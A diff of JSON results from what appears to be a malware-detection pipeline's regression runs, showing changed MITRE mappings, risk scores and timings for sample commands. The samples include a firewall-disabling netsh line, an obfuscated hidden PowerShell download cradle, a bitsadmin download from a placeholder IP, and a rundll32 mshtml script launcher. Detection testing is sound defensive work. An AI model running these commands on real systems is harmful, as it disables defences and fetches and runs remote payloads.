-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
+            "mitre": [
+              {
+                "id": "T1119",
+                "tactic": "Collection",
+                "technique": "Automated collection: recursive file-type search"
+              }
+            ],
             "osint": null,
             "risk": {
               "level": "safe",
-              "score": 4,
+              "score": 9,
               "verdict": "Benign"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.081,
+              "elapsed_ms": 0.137,
               "status": "ok"
             },
             "yara": [
@@ -5690,7 +5393,7 @@
               }
             ]
           },
-          "elapsed_ms": 226.6,
+          "elapsed_ms": 155.5,
           "status": 200
         },
         "die": {
@@ -5707,7 +5410,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 140.8,
+          "elapsed_ms": 97.9,
           "status": 200
         },
         "narrate": {
@@ -5722,7 +5425,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 110.1,
+          "elapsed_ms": 100.9,
           "status": 200
         },
         "upload": {
@@ -5750,7 +5453,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 96.4,
+          "elapsed_ms": 101.9,
           "status": 200
         }
       },
@@ -5771,24 +5474,23 @@
               "urls": []
             },
             "lolbas": [],
-            "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1119"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
+            "mitre": [
+              {
+                "id": "T1119",
+                "tactic": "Collection",
+                "technique": "Automated collection: recursive file-type search"
+              }
+            ],
             "osint": null,
             "risk": {
               "level": "safe",
-              "score": 4,
+              "score": 9,
               "verdict": "Benign"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.085,
+              "elapsed_ms": 0.087,
               "status": "ok"
             },
             "yara": [
@@ -5800,7 +5502,7 @@
               }
             ]
           },
-          "elapsed_ms": 195.4,
+          "elapsed_ms": 183.7,
           "status": 200
         },
         "die": {
@@ -5817,7 +5519,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 95.9,
+          "elapsed_ms": 111.7,
           "status": 200
         },
         "narrate": {
@@ -5832,7 +5534,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 96.5,
+          "elapsed_ms": 89.5,
           "status": 200
         },
         "upload": {
@@ -5860,7 +5562,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 123.4,
+          "elapsed_ms": 99.0,
           "status": 200
         }
       }
@@ -5997,29 +5699,11 @@
             ],
             "mitre": [
               {
-                "evidence": "netsh advfirewall \u2026 state off \u2014 Windows Firewall disabled.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1562.004",
-                    "evidence_ref": "ev-7aa5cee624eb",
-                    "field": "analyzer_evidence",
-                    "observed_value": "netsh advfirewall \u2026 state off \u2014 Windows Firewall disabled.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1562.004",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Defense Evasion",
-                "technique": "Impair Defenses: Disable or Modify System Firewall"
+                "technique": "Disable or Modify System Firewall"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "low",
@@ -6029,7 +5713,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.081,
+              "elapsed_ms": 0.097,
               "status": "ok"
             },
             "yara": [
@@ -6041,7 +5725,7 @@
               }
             ]
           },
-          "elapsed_ms": 151.0,
+          "elapsed_ms": 196.7,
           "status": 200
         },
         "die": {
@@ -6136,7 +5820,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.5,
+          "elapsed_ms": 101.7,
           "status": 200
         },
         "narrate": {
@@ -6169,7 +5853,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 96.2,
+          "elapsed_ms": 117.7,
           "status": 200
         },
         "upload": {
@@ -6197,7 +5881,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 99.1,
+          "elapsed_ms": 99.3,
           "status": 200
         }
       },
@@ -6236,29 +5920,11 @@
             ],
             "mitre": [
               {
-                "evidence": "netsh advfirewall \u2026 state off \u2014 Windows Firewall disabled.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1562.004",
-                    "evidence_ref": "ev-7aa5cee624eb",
-                    "field": "analyzer_evidence",
-                    "observed_value": "netsh advfirewall \u2026 state off \u2014 Windows Firewall disabled.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1562.004",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Defense Evasion",
-                "technique": "Impair Defenses: Disable or Modify System Firewall"
+                "technique": "Disable or Modify System Firewall"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "low",
@@ -6268,7 +5934,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.13,
+              "elapsed_ms": 0.099,
               "status": "ok"
             },
             "yara": [
@@ -6280,7 +5946,7 @@
               }
             ]
           },
-          "elapsed_ms": 151.4,
+          "elapsed_ms": 148.9,
           "status": 200
         },
         "die": {
@@ -6375,7 +6041,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.0,
+          "elapsed_ms": 143.3,
           "status": 200
         },
         "narrate": {
@@ -6408,7 +6074,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 110.0,
+          "elapsed_ms": 114.9,
           "status": 200
         },
         "upload": {
@@ -6436,7 +6102,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 120.0,
+          "elapsed_ms": 98.1,
           "status": 200
         }
       }
@@ -6504,12 +6170,10 @@
           "mitre_ids": [
             "T1027",
             "T1059.001",
-            "T1105",
-            "T1140",
-            "T1564.003"
+            "T1140"
           ],
           "risk_level": "high",
-          "risk_score_bucket": 100,
+          "risk_score_bucket": 80,
           "verdict_label": "Malicious"
         },
         "run2_snapshot": {
@@ -6568,12 +6232,10 @@
           "mitre_ids": [
             "T1027",
             "T1059.001",
-            "T1105",
-            "T1140",
-            "T1564.003"
+            "T1140"
           ],
           "risk_level": "high",
-          "risk_score_bucket": 100,
+          "risk_score_bucket": 80,
           "verdict_label": "Malicious"
         },
         "upload_dedup_flipped": false
@@ -6613,111 +6275,31 @@
             ],
             "mitre": [
               {
-                "evidence": "PowerShell -EncodedCommand or Base64 payload.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1027",
-                    "evidence_ref": "ev-083be87a5511",
-                    "field": "analyzer_evidence",
-                    "observed_value": "PowerShell -EncodedCommand or Base64 payload.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1027",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Obfuscated Files or Information"
-              },
-              {
-                "evidence": "Invoke-Expression / IEX / & alias.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.001",
-                    "evidence_ref": "ev-1deda02cd400",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Invoke-Expression / IEX / & alias.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1059.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Execution",
-                "technique": "PowerShell"
+                "technique": "PowerShell (hidden)"
               },
               {
-                "evidence": "-WindowStyle Hidden.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1564.003",
-                    "evidence_ref": "ev-727f6c6a31f6",
-                    "field": "analyzer_evidence",
-                    "observed_value": "-WindowStyle Hidden.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1564.003",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Hide Artifacts: Hidden Window"
-              },
-              {
-                "evidence": "Download cradle (WebClient / iwr / curl).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-aef15a12bb92",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Download cradle (WebClient / iwr / curl).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Command and Control",
-                "technique": "Ingress Tool Transfer"
-              },
-              {
-                "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1140",
-                    "evidence_ref": "ev-2f18b9fe8e72",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1140",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Defense Evasion",
                 "technique": "Deobfuscate/Decode Files or Information"
+              },
+              {
+                "id": "T1027",
+                "tactic": "Defense Evasion",
+                "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
-              "score": 100,
+              "score": 84,
               "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.085,
+              "elapsed_ms": 0.099,
               "status": "ok"
             },
             "yara": [
@@ -6747,7 +6329,7 @@
               }
             ]
           },
-          "elapsed_ms": 158.6,
+          "elapsed_ms": 151.9,
           "status": 200
         },
         "die": {
@@ -7064,7 +6646,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.4,
+          "elapsed_ms": 98.1,
           "status": 200
         },
         "narrate": {
@@ -7140,7 +6722,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.2,
+          "elapsed_ms": 96.4,
           "status": 200
         },
         "upload": {
@@ -7168,7 +6750,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 115.3,
+          "elapsed_ms": 102.6,
           "status": 200
         }
       },
@@ -7207,111 +6789,31 @@
             ],
             "mitre": [
               {
-                "evidence": "PowerShell -EncodedCommand or Base64 payload.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1027",
-                    "evidence_ref": "ev-083be87a5511",
-                    "field": "analyzer_evidence",
-                    "observed_value": "PowerShell -EncodedCommand or Base64 payload.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1027",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Obfuscated Files or Information"
-              },
-              {
-                "evidence": "Invoke-Expression / IEX / & alias.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.001",
-                    "evidence_ref": "ev-1deda02cd400",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Invoke-Expression / IEX / & alias.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1059.001",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Execution",
-                "technique": "PowerShell"
+                "technique": "PowerShell (hidden)"
               },
               {
-                "evidence": "-WindowStyle Hidden.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1564.003",
-                    "evidence_ref": "ev-727f6c6a31f6",
-                    "field": "analyzer_evidence",
-                    "observed_value": "-WindowStyle Hidden.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1564.003",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Defense Evasion",
-                "technique": "Hide Artifacts: Hidden Window"
-              },
-              {
-                "evidence": "Download cradle (WebClient / iwr / curl).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-aef15a12bb92",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Download cradle (WebClient / iwr / curl).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Command and Control",
-                "technique": "Ingress Tool Transfer"
-              },
-              {
-                "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1140",
-                    "evidence_ref": "ev-2f18b9fe8e72",
-                    "field": "analyzer_evidence",
-                    "observed_value": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
                 "id": "T1140",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Defense Evasion",
                 "technique": "Deobfuscate/Decode Files or Information"
+              },
+              {
+                "id": "T1027",
+                "tactic": "Defense Evasion",
+                "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "high",
-              "score": 100,
+              "score": 84,
               "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.109,
+              "elapsed_ms": 0.096,
               "status": "ok"
             },
             "yara": [
@@ -7341,7 +6843,7 @@
               }
             ]
           },
-          "elapsed_ms": 179.3,
+          "elapsed_ms": 154.2,
           "status": 200
         },
         "die": {
@@ -7658,7 +7160,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.5,
+          "elapsed_ms": 101.8,
           "status": 200
         },
         "narrate": {
@@ -7734,7 +7236,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.7,
+          "elapsed_ms": 102.8,
           "status": 200
         },
         "upload": {
@@ -7762,7 +7264,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 98.7,
+          "elapsed_ms": 97.4,
           "status": 200
         }
       }
@@ -7858,11 +7360,6 @@
             },
             "lolbas": [],
             "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "safe",
@@ -7872,12 +7369,12 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.085,
+              "elapsed_ms": 0.113,
               "status": "ok"
             },
             "yara": []
           },
-          "elapsed_ms": 147.9,
+          "elapsed_ms": 151.7,
           "status": 200
         },
         "die": {
@@ -7894,7 +7391,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 98.0,
+          "elapsed_ms": 94.7,
           "status": 200
         },
         "narrate": {
@@ -7909,7 +7406,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 96.3,
+          "elapsed_ms": 92.0,
           "status": 200
         },
         "upload": {
@@ -7935,7 +7432,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 108.5,
+          "elapsed_ms": 100.7,
           "status": 200
         }
       },
@@ -7957,11 +7454,6 @@
             },
             "lolbas": [],
             "mitre": [],
-            "mitre_provenance": {
-              "regex_extra": [],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
               "level": "safe",
@@ -7971,12 +7463,12 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.104,
+              "elapsed_ms": 0.103,
               "status": "ok"
             },
             "yara": []
           },
-          "elapsed_ms": 161.6,
+          "elapsed_ms": 149.1,
           "status": 200
         },
         "die": {
@@ -7993,7 +7485,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 127.5,
+          "elapsed_ms": 96.9,
           "status": 200
         },
         "narrate": {
@@ -8008,7 +7500,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 92.5,
+          "elapsed_ms": 95.3,
           "status": 200
         },
         "upload": {
@@ -8034,7 +7526,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 100.6,
+          "elapsed_ms": 97.7,
           "status": 200
         }
       }
@@ -8113,7 +7605,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 98.1,
+          "elapsed_ms": 97.5,
           "status": 200
         },
         "narrate": {
@@ -8143,7 +7635,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 101.3,
+          "elapsed_ms": 95.2,
           "status": 200
         }
       },
@@ -8166,7 +7658,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 94.3,
+          "elapsed_ms": 93.7,
           "status": 200
         },
         "narrate": {
@@ -8196,7 +7688,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 94.5,
+          "elapsed_ms": 107.7,
           "status": 200
         }
       }
@@ -8255,11 +7747,13 @@
             "bitsadmin.exe"
           ],
           "mitre_ids": [
-            "T1105"
+            "T1074.001",
+            "T1105",
+            "T1197"
           ],
-          "risk_level": "medium",
-          "risk_score_bucket": 60,
-          "verdict_label": "Suspicious"
+          "risk_level": "high",
+          "risk_score_bucket": 80,
+          "verdict_label": "Malicious"
         },
         "run2_snapshot": {
           "evidence_count": 1,
@@ -8308,11 +7802,13 @@
             "bitsadmin.exe"
           ],
           "mitre_ids": [
-            "T1105"
+            "T1074.001",
+            "T1105",
+            "T1197"
           ],
-          "risk_level": "medium",
-          "risk_score_bucket": 60,
-          "verdict_label": "Suspicious"
+          "risk_level": "high",
+          "risk_score_bucket": 80,
+          "verdict_label": "Malicious"
         },
         "upload_dedup_flipped": false
       },
@@ -8355,42 +7851,31 @@
             ],
             "mitre": [
               {
-                "evidence": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-d74e960712f3",
-                    "field": "analyzer_evidence",
-                    "observed_value": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
+                "id": "T1197",
+                "tactic": "Defense Evasion",
+                "technique": "BITS Jobs"
+              },
+              {
                 "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Command and Control",
                 "technique": "Ingress Tool Transfer"
+              },
+              {
+                "id": "T1074.001",
+                "tactic": "Collection",
+                "technique": "Local staging in Public/ProgramData/Temp directory"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1074.001",
-                "T1197"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
-              "level": "medium",
-              "score": 65,
-              "verdict": "Suspicious"
+              "level": "high",
+              "score": 83,
+              "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 500.9,
+              "elapsed_ms": 502.31,
               "status": "timeout"
             },
             "yara": [
@@ -8402,7 +7887,7 @@
               }
             ]
           },
-          "elapsed_ms": 661.9,
+          "elapsed_ms": 654.5,
           "status": 200
         },
         "die": {
@@ -8621,7 +8106,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.7,
+          "elapsed_ms": 98.2,
           "status": 200
         },
         "narrate": {
@@ -8681,7 +8166,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.0,
+          "elapsed_ms": 96.4,
           "status": 200
         },
         "upload": {
@@ -8709,7 +8194,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 100.2,
+          "elapsed_ms": 98.3,
           "status": 200
         }
       },
@@ -8752,42 +8237,31 @@
             ],
             "mitre": [
               {
-                "evidence": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-d74e960712f3",
-                    "field": "analyzer_evidence",
-                    "observed_value": "CMD download cradle (curl/certutil/bitsadmin/powershell).",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
+                "id": "T1197",
+                "tactic": "Defense Evasion",
+                "technique": "BITS Jobs"
+              },
+              {
                 "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
                 "tactic": "Command and Control",
                 "technique": "Ingress Tool Transfer"
+              },
+              {
+                "id": "T1074.001",
+                "tactic": "Collection",
+                "technique": "Local staging in Public/ProgramData/Temp directory"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1074.001",
-                "T1197"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
-              "level": "medium",
-              "score": 65,
-              "verdict": "Suspicious"
+              "level": "high",
+              "score": 83,
+              "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.166,
+              "elapsed_ms": 501.635,
               "status": "timeout"
             },
             "yara": [
@@ -8799,7 +8273,7 @@
               }
             ]
           },
-          "elapsed_ms": 658.2,
+          "elapsed_ms": 650.5,
           "status": 200
         },
         "die": {
@@ -9018,7 +8492,7 @@
               ]
             }
           },
-          "elapsed_ms": 132.7,
+          "elapsed_ms": 94.0,
           "status": 200
         },
         "narrate": {
@@ -9078,7 +8552,7 @@
               ]
             }
           },
-          "elapsed_ms": 100.3,
+          "elapsed_ms": 97.1,
           "status": 200
         },
         "upload": {
@@ -9106,7 +8580,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 129.8,
+          "elapsed_ms": 95.6,
           "status": 200
         }
       }
@@ -9163,13 +8637,13 @@
             "rundll32.exe"
           ],
           "mitre_ids": [
-            "T1027",
-            "T1059.007",
-            "T1105"
+            "T1021.002",
+            "T1218.005",
+            "T1218.011"
           ],
-          "risk_level": "medium",
-          "risk_score_bucket": 70,
-          "verdict_label": "Suspicious"
+          "risk_level": "high",
+          "risk_score_bucket": 80,
+          "verdict_label": "Malicious"
         },
         "run2_snapshot": {
           "evidence_count": 3,
@@ -9216,13 +8690,13 @@
             "rundll32.exe"
           ],
           "mitre_ids": [
-            "T1027",
-            "T1059.007",
-            "T1105"
+            "T1021.002",
+            "T1218.005",
+            "T1218.011"
           ],
-          "risk_level": "medium",
-          "risk_score_bucket": 70,
-          "verdict_label": "Suspicious"
+          "risk_level": "high",
+          "risk_score_bucket": 80,
+          "verdict_label": "Malicious"
         },
         "upload_dedup_flipped": false
       },
@@ -9260,79 +8734,31 @@
             ],
             "mitre": [
               {
-                "evidence": "eval / Function constructor / fromCharCode / atob.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1027",
-                    "evidence_ref": "ev-55ec6407ea6c",
-                    "field": "analyzer_evidence",
-                    "observed_value": "eval / Function constructor / fromCharCode / atob.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1027",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
+                "id": "T1218.011",
                 "tactic": "Defense Evasion",
-                "technique": "Obfuscated Files or Information"
+                "technique": "Rundll32"
               },
               {
-                "evidence": "ActiveXObject / WScript.Shell RCE.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.007",
-                    "evidence_ref": "ev-fe0462d86916",
-                    "field": "analyzer_evidence",
-                    "observed_value": "ActiveXObject / WScript.Shell RCE.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1059.007",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Execution",
-                "technique": "JavaScript"
+                "id": "T1021.002",
+                "tactic": "Lateral Movement",
+                "technique": "SMB/Windows Admin Shares: UNC-path execution via pushd/rundll32"
               },
               {
-                "evidence": "XHR / fetch / ADODB.Stream download.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-bdaaee76ee4c",
-                    "field": "analyzer_evidence",
-                    "observed_value": "XHR / fetch / ADODB.Stream download.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Command and Control",
-                "technique": "Ingress Tool Transfer"
+                "id": "T1218.005",
+                "tactic": "Defense Evasion",
+                "technique": "mshta-style javascript:/vbscript: URI fragment"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1021.002",
-                "T1218.005",
-                "T1218.011"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
-              "level": "medium",
-              "score": 68,
-              "verdict": "Suspicious"
+              "level": "high",
+              "score": 78,
+              "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.089,
+              "elapsed_ms": 0.082,
               "status": "ok"
             },
             "yara": [
@@ -9350,7 +8776,7 @@
               }
             ]
           },
-          "elapsed_ms": 156.3,
+          "elapsed_ms": 149.0,
           "status": 200
         },
         "die": {
@@ -9786,7 +9212,7 @@
               ]
             }
           },
-          "elapsed_ms": 112.1,
+          "elapsed_ms": 105.2,
           "status": 200
         },
         "narrate": {
@@ -9844,7 +9270,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.2,
+          "elapsed_ms": 112.8,
           "status": 200
         },
         "upload": {
@@ -9872,7 +9298,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 100.0,
+          "elapsed_ms": 101.9,
           "status": 200
         }
       },
@@ -9910,79 +9336,31 @@
             ],
             "mitre": [
               {
-                "evidence": "eval / Function constructor / fromCharCode / atob.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1027",
-                    "evidence_ref": "ev-55ec6407ea6c",
-                    "field": "analyzer_evidence",
-                    "observed_value": "eval / Function constructor / fromCharCode / atob.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1027",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
+                "id": "T1218.011",
                 "tactic": "Defense Evasion",
-                "technique": "Obfuscated Files or Information"
+                "technique": "Rundll32"
               },
               {
-                "evidence": "ActiveXObject / WScript.Shell RCE.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1059.007",
-                    "evidence_ref": "ev-fe0462d86916",
-                    "field": "analyzer_evidence",
-                    "observed_value": "ActiveXObject / WScript.Shell RCE.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1059.007",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Execution",
-                "technique": "JavaScript"
+                "id": "T1021.002",
